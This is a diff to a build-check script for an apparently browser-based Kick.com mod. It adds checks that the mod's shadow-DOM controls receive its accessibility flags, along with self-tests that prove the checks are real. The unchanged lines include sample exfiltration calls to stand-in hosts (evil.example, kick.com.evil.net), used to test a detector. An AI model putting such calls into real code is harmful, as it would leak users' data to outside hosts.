@@ -76,6 +76,23 @@ for (const [bundleName, bundleSource] of bundleTargets) {
   }
 }
 
+/**
+ * Which accessibility flags a bundle keys off the shadow **host**.
+ *
+ * The mod's own chrome lives in a shadow root, so the site rules written at
+ * `html[data-kf-...]` cannot reach it — "larger targets" and "reduce motion"
+ * styled Kick's controls and left ours alone. `:host-context()` would cross the
+ * boundary, but Firefox has never implemented it and the build ships a Firefox
+ * artifact, so only `:host([...])` counts here. The `(` immediately after
+ * `:host` is what rejects `:host-context(`.
+ */
+const hostKeyedAccessibility = (bundle) =>
+  new Set([...String(bundle).matchAll(/:host\(\[data-kf-(large-targets|reduce-motion)="true"\]\)/g)].map((match) => match[1]));
+const shadowAccessibilityWired = (bundle) => {
+  const flags = hostKeyedAccessibility(bundle);
+  return flags.has('large-targets') && flags.has('reduce-motion');
+};
+
 const checks = [
   // The detail goes in the label, not the value: this loop treats any truthy
   // value as a pass, so `gaps.length === 0 || gaps.join()` would report success
@@ -88,6 +105,11 @@ const checks = [
   ['targets Kick HTTPS', source.includes('// @match        https://kick.com/*')],
   ['contains no remote code dependency', !/@require\s|@resource\s/i.test(source)],
   ['ships settings UI', source.includes('data-kf-settings-shell')],
+  ['larger targets and reduce motion reach the mod own shadow controls in every bundle',
+    bundleTargets.every(([, bundleSource]) => shadowAccessibilityWired(bundleSource))],
+  ['the shadow host is actually stamped with those flags',
+    bundleTargets.every(([, bundleSource]) => bundleSource.includes('uiHost.dataset.kfLargeTargets')
+      && bundleSource.includes('uiHost.dataset.kfReduceMotion'))],
   ['ships Poor mode with exact spending-control tagging', source.includes('data-kf-poor-mode')
     && source.includes('data-kf-monetization')
     && source.includes("id === 'poor'")],
@@ -473,8 +495,18 @@ const redProbes = [
   ['content-scripts gate would reject an empty matches list', !contentScriptsScoped([{ matches: [] }])],
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
+  ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  // Firefox has never implemented :host-context(), so a rule written that way
+  // would style Chromium and silently skip the Firefox artifact.
+  ['shadow-a11y gate would reject :host-context, which Firefox does not implement',
+    !shadowAccessibilityWired(':host-context([data-kf-large-targets="true"]) button{} :host-context([data-kf-reduce-motion="true"]) * {}')],
+  // The site-level rules are not a substitute: they cannot cross the shadow
+  // boundary, which is the entire defect this gate exists to catch.
+  ['shadow-a11y gate would reject the site-level rules alone',
+    !shadowAccessibilityWired('html[data-kf-large-targets="true"] button{} html[data-kf-reduce-motion="true"] *{}')],
   // The live gate itself must be the real thing on this machine, not a skip.
   ['content-scripts gate accepts the real manifest', contentScriptsScoped(manifest.content_scripts)],
+  ['shadow-a11y gate accepts the real bundle', shadowAccessibilityWired(source)],
 ];
 for (const [label, fires] of redProbes) {
   if (!fires) throw new Error(`Red probe failed (gate is vacuous): ${label}`);
